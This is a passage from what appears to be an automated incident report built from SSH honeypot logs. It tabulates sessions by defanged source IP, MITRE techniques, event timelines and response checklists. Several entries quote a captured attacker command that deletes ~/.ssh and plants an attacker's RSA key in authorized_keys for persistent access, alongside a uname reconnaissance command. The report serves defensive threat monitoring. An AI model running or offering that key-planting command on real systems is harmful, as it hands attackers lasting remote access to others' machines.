| `2026-09-20 16:38:23` | `cowrie.command.input` |
| `2026-09-20 16:38:24` | `cowrie.session.file_download` |
| `2026-09-20 16:38:24` | `cowrie.log.closed` |
| `2026-09-20 16:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49882d501ea5

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-09-20 16:38 |
| **Last Seen** | 2026-09-20 16:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:38:24` | `cowrie.session.connect` |
| `2026-09-20 16:38:24` | `cowrie.client.version` |
| `2026-09-20 16:38:24` | `cowrie.client.kex` |
| `2026-09-20 16:38:25` | `cowrie.login.success` |
| `2026-09-20 16:38:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-223ba91c4b36

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-09-20 16:38 |
| **Last Seen** | 2026-09-20 16:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:38:25` | `cowrie.session.connect` |
| `2026-09-20 16:38:25` | `cowrie.client.version` |
| `2026-09-20 16:38:26` | `cowrie.client.kex` |
| `2026-09-20 16:38:27` | `cowrie.login.success` |
| `2026-09-20 16:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1174bee27b04

| Field | Detail |
|---|---|
| **Source IP** | `200.175.61[.]207` |
| **First Seen** | 2026-09-20 16:38 |
| **Last Seen** | 2026-09-20 16:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:38:52` | `cowrie.session.connect` |
| `2026-09-20 16:38:52` | `cowrie.client.version` |
| `2026-09-20 16:38:52` | `cowrie.client.kex` |
| `2026-09-20 16:38:53` | `cowrie.login.success` |
| `2026-09-20 16:38:54` | `cowrie.session.params` |
| `2026-09-20 16:38:54` | `cowrie.command.input` |
| `2026-09-20 16:38:54` | `cowrie.command.failed` |
| `2026-09-20 16:38:54` | `cowrie.log.closed` |
| `2026-09-20 16:38:55` | `cowrie.session.params` |
| `2026-09-20 16:38:55` | `cowrie.command.input` |
| `2026-09-20 16:38:55` | `cowrie.session.file_download` |
| `2026-09-20 16:38:55` | `cowrie.log.closed` |
| `2026-09-20 16:38:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.175.61[.]207` to AbuseIPDB if not already reported
- [ ] Block `200.175.61[.]207` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2909ddeaadbc

| Field | Detail |
|---|---|
| **Source IP** | `200.175.61[.]207` |
| **First Seen** | 2026-09-20 16:38 |
| **Last Seen** | 2026-09-20 16:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:38:55` | `cowrie.session.connect` |
| `2026-09-20 16:38:55` | `cowrie.client.version` |
| `2026-09-20 16:38:55` | `cowrie.client.kex` |
| `2026-09-20 16:38:56` | `cowrie.login.success` |
| `2026-09-20 16:38:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.175.61[.]207` to AbuseIPDB if not already reported
- [ ] Block `200.175.61[.]207` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f9739f61e70

| Field | Detail |
|---|---|
| **Source IP** | `200.175.61[.]207` |
| **First Seen** | 2026-09-20 16:38 |
| **Last Seen** | 2026-09-20 16:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:38:56` | `cowrie.session.connect` |
| `2026-09-20 16:38:56` | `cowrie.client.version` |
| `2026-09-20 16:38:56` | `cowrie.client.kex` |
| `2026-09-20 16:38:57` | `cowrie.login.success` |
| `2026-09-20 16:38:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.175.61[.]207` to AbuseIPDB if not already reported
- [ ] Block `200.175.61[.]207` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-090095d50f98

| Field | Detail |
|---|---|
| **Source IP** | `146.199.17[.]126` |
| **First Seen** | 2026-09-20 16:40 |
| **Last Seen** | 2026-09-20 16:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:40:33` | `cowrie.session.connect` |
| `2026-09-20 16:40:33` | `cowrie.client.version` |
| `2026-09-20 16:40:33` | `cowrie.client.kex` |
| `2026-09-20 16:40:33` | `cowrie.login.success` |
| `2026-09-20 16:40:34` | `cowrie.session.params` |
| `2026-09-20 16:40:34` | `cowrie.command.input` |
| `2026-09-20 16:40:34` | `cowrie.command.failed` |
| `2026-09-20 16:40:34` | `cowrie.log.closed` |
| `2026-09-20 16:40:35` | `cowrie.session.params` |
| `2026-09-20 16:40:35` | `cowrie.command.input` |
| `2026-09-20 16:40:35` | `cowrie.session.file_download` |
| `2026-09-20 16:40:35` | `cowrie.log.closed` |
| `2026-09-20 16:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.199.17[.]126` to AbuseIPDB if not already reported
- [ ] Block `146.199.17[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea3ca8ca2c6c

| Field | Detail |
|---|---|
| **Source IP** | `146.199.17[.]126` |
| **First Seen** | 2026-09-20 16:40 |
| **Last Seen** | 2026-09-20 16:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:40:35` | `cowrie.session.connect` |
| `2026-09-20 16:40:35` | `cowrie.client.version` |
| `2026-09-20 16:40:35` | `cowrie.client.kex` |
| `2026-09-20 16:40:36` | `cowrie.login.success` |
| `2026-09-20 16:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.199.17[.]126` to AbuseIPDB if not already reported
- [ ] Block `146.199.17[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b38578244c5

| Field | Detail |
|---|---|
| **Source IP** | `146.199.17[.]126` |
| **First Seen** | 2026-09-20 16:40 |
| **Last Seen** | 2026-09-20 16:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:40:36` | `cowrie.session.connect` |
| `2026-09-20 16:40:36` | `cowrie.client.version` |
| `2026-09-20 16:40:36` | `cowrie.client.kex` |
| `2026-09-20 16:40:36` | `cowrie.login.success` |
| `2026-09-20 16:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.199.17[.]126` to AbuseIPDB if not already reported
- [ ] Block `146.199.17[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7442ff854b9a

| Field | Detail |
|---|---|
| **Source IP** | `57.129.120[.]143` |
| **First Seen** | 2026-09-20 16:40 |
| **Last Seen** | 2026-09-20 16:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:40:40` | `cowrie.session.connect` |
| `2026-09-20 16:40:40` | `cowrie.client.version` |
| `2026-09-20 16:40:40` | `cowrie.client.kex` |
| `2026-09-20 16:40:40` | `cowrie.login.success` |
| `2026-09-20 16:40:41` | `cowrie.session.params` |
| `2026-09-20 16:40:41` | `cowrie.command.input` |
| `2026-09-20 16:40:41` | `cowrie.command.failed` |
| `2026-09-20 16:40:41` | `cowrie.log.closed` |
| `2026-09-20 16:40:42` | `cowrie.session.params` |
| `2026-09-20 16:40:42` | `cowrie.command.input` |
| `2026-09-20 16:40:42` | `cowrie.session.file_download` |
| `2026-09-20 16:40:42` | `cowrie.log.closed` |
| `2026-09-20 16:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.129.120[.]143` to AbuseIPDB if not already reported
- [ ] Block `57.129.120[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73c75bfa235a

| Field | Detail |
|---|---|
| **Source IP** | `57.129.120[.]143` |
| **First Seen** | 2026-09-20 16:40 |
| **Last Seen** | 2026-09-20 16:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:40:42` | `cowrie.session.connect` |
| `2026-09-20 16:40:42` | `cowrie.client.version` |
| `2026-09-20 16:40:42` | `cowrie.client.kex` |
| `2026-09-20 16:40:42` | `cowrie.login.success` |
| `2026-09-20 16:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.129.120[.]143` to AbuseIPDB if not already reported
- [ ] Block `57.129.120[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca62b7b0c626

| Field | Detail |
|---|---|
| **Source IP** | `57.129.120[.]143` |
| **First Seen** | 2026-09-20 16:40 |
| **Last Seen** | 2026-09-20 16:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:40:42` | `cowrie.session.connect` |
| `2026-09-20 16:40:42` | `cowrie.client.version` |
| `2026-09-20 16:40:43` | `cowrie.client.kex` |
| `2026-09-20 16:40:43` | `cowrie.login.success` |
| `2026-09-20 16:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.129.120[.]143` to AbuseIPDB if not already reported
- [ ] Block `57.129.120[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eb9655e492b

| Field | Detail |
|---|---|
| **Source IP** | `103.183.75[.]92` |
| **First Seen** | 2026-09-20 16:41 |
| **Last Seen** | 2026-09-20 16:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:41:36` | `cowrie.session.connect` |
| `2026-09-20 16:41:36` | `cowrie.client.version` |
| `2026-09-20 16:41:36` | `cowrie.client.kex` |
| `2026-09-20 16:41:37` | `cowrie.login.success` |
| `2026-09-20 16:41:38` | `cowrie.session.params` |
| `2026-09-20 16:41:38` | `cowrie.command.input` |
| `2026-09-20 16:41:38` | `cowrie.command.failed` |
| `2026-09-20 16:41:39` | `cowrie.log.closed` |
| `2026-09-20 16:41:40` | `cowrie.session.params` |
| `2026-09-20 16:41:40` | `cowrie.command.input` |
| `2026-09-20 16:41:40` | `cowrie.session.file_download` |
| `2026-09-20 16:41:40` | `cowrie.log.closed` |
| `2026-09-20 16:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.75[.]92` to AbuseIPDB if not already reported
- [ ] Block `103.183.75[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0840e80f3b7

| Field | Detail |
|---|---|
| **Source IP** | `103.183.75[.]92` |
| **First Seen** | 2026-09-20 16:41 |
| **Last Seen** | 2026-09-20 16:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:41:40` | `cowrie.session.connect` |
| `2026-09-20 16:41:40` | `cowrie.client.version` |
| `2026-09-20 16:41:40` | `cowrie.client.kex` |
| `2026-09-20 16:41:41` | `cowrie.login.success` |
| `2026-09-20 16:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.75[.]92` to AbuseIPDB if not already reported
- [ ] Block `103.183.75[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48cc1e9bb9f2

| Field | Detail |
|---|---|
| **Source IP** | `103.183.75[.]92` |
| **First Seen** | 2026-09-20 16:41 |
| **Last Seen** | 2026-09-20 16:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:41:42` | `cowrie.session.connect` |
| `2026-09-20 16:41:42` | `cowrie.client.version` |
| `2026-09-20 16:41:42` | `cowrie.client.kex` |
| `2026-09-20 16:41:43` | `cowrie.login.success` |
| `2026-09-20 16:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.75[.]92` to AbuseIPDB if not already reported
- [ ] Block `103.183.75[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bc73a66d89a

| Field | Detail |
|---|---|
| **Source IP** | `183.88.232[.]183` |
| **First Seen** | 2026-09-20 16:42 |
| **Last Seen** | 2026-09-20 16:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:42:40` | `cowrie.session.connect` |
| `2026-09-20 16:42:40` | `cowrie.client.version` |
| `2026-09-20 16:42:41` | `cowrie.client.kex` |
| `2026-09-20 16:42:42` | `cowrie.login.success` |
| `2026-09-20 16:42:43` | `cowrie.session.params` |
| `2026-09-20 16:42:43` | `cowrie.command.input` |
| `2026-09-20 16:42:43` | `cowrie.command.failed` |
| `2026-09-20 16:42:43` | `cowrie.log.closed` |
| `2026-09-20 16:42:44` | `cowrie.session.params` |
| `2026-09-20 16:42:44` | `cowrie.command.input` |
| `2026-09-20 16:42:44` | `cowrie.session.file_download` |
| `2026-09-20 16:42:44` | `cowrie.log.closed` |
| `2026-09-20 16:42:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.88.232[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.88.232[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e59a55c9779

| Field | Detail |
|---|---|
| **Source IP** | `183.88.232[.]183` |
| **First Seen** | 2026-09-20 16:42 |
| **Last Seen** | 2026-09-20 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:42:45` | `cowrie.session.connect` |
| `2026-09-20 16:42:45` | `cowrie.client.version` |
| `2026-09-20 16:42:45` | `cowrie.client.kex` |
| `2026-09-20 16:42:46` | `cowrie.login.success` |
| `2026-09-20 16:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.88.232[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.88.232[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3c4fb157ad9

| Field | Detail |
|---|---|
| **Source IP** | `183.88.232[.]183` |
| **First Seen** | 2026-09-20 16:42 |
| **Last Seen** | 2026-09-20 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:42:47` | `cowrie.session.connect` |
| `2026-09-20 16:42:47` | `cowrie.client.version` |
| `2026-09-20 16:42:47` | `cowrie.client.kex` |
| `2026-09-20 16:42:48` | `cowrie.login.success` |
| `2026-09-20 16:42:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.88.232[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.88.232[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bb630f1288d

| Field | Detail |
|---|---|
| **Source IP** | `203.145.35[.]27` |
| **First Seen** | 2026-09-20 16:45 |
| **Last Seen** | 2026-09-20 16:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:45:52` | `cowrie.session.connect` |
| `2026-09-20 16:45:52` | `cowrie.client.version` |
| `2026-09-20 16:45:53` | `cowrie.client.kex` |
| `2026-09-20 16:45:54` | `cowrie.login.success` |
| `2026-09-20 16:45:55` | `cowrie.session.params` |
| `2026-09-20 16:45:55` | `cowrie.command.input` |
| `2026-09-20 16:45:55` | `cowrie.command.failed` |
| `2026-09-20 16:45:55` | `cowrie.log.closed` |
| `2026-09-20 16:45:56` | `cowrie.session.params` |
| `2026-09-20 16:45:56` | `cowrie.command.input` |
| `2026-09-20 16:45:56` | `cowrie.session.file_download` |
| `2026-09-20 16:45:56` | `cowrie.log.closed` |
| `2026-09-20 16:46:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.145.35[.]27` to AbuseIPDB if not already reported
- [ ] Block `203.145.35[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08b0b951b25e

| Field | Detail |
|---|---|
| **Source IP** | `203.145.35[.]27` |
| **First Seen** | 2026-09-20 16:45 |
| **Last Seen** | 2026-09-20 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:45:57` | `cowrie.session.connect` |
| `2026-09-20 16:45:57` | `cowrie.client.version` |
| `2026-09-20 16:45:57` | `cowrie.client.kex` |
| `2026-09-20 16:45:58` | `cowrie.login.success` |
| `2026-09-20 16:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.145.35[.]27` to AbuseIPDB if not already reported
- [ ] Block `203.145.35[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43e1cc5f32fe

| Field | Detail |
|---|---|
| **Source IP** | `203.145.35[.]27` |
| **First Seen** | 2026-09-20 16:45 |
| **Last Seen** | 2026-09-20 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:45:58` | `cowrie.session.connect` |
| `2026-09-20 16:45:58` | `cowrie.client.version` |
| `2026-09-20 16:45:59` | `cowrie.client.kex` |
| `2026-09-20 16:46:00` | `cowrie.login.success` |
| `2026-09-20 16:46:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.145.35[.]27` to AbuseIPDB if not already reported
- [ ] Block `203.145.35[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1516d2523102

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:48 |
| **Last Seen** | 2026-09-20 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:48:49` | `cowrie.session.connect` |
| `2026-09-20 16:48:49` | `cowrie.client.version` |
| `2026-09-20 16:48:49` | `cowrie.client.kex` |
| `2026-09-20 16:48:50` | `cowrie.login.success` |
| `2026-09-20 16:48:51` | `cowrie.session.params` |
| `2026-09-20 16:48:51` | `cowrie.command.input` |
| `2026-09-20 16:48:51` | `cowrie.log.closed` |
| `2026-09-20 16:48:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8e65a4a1692

| Field | Detail |
|---|---|
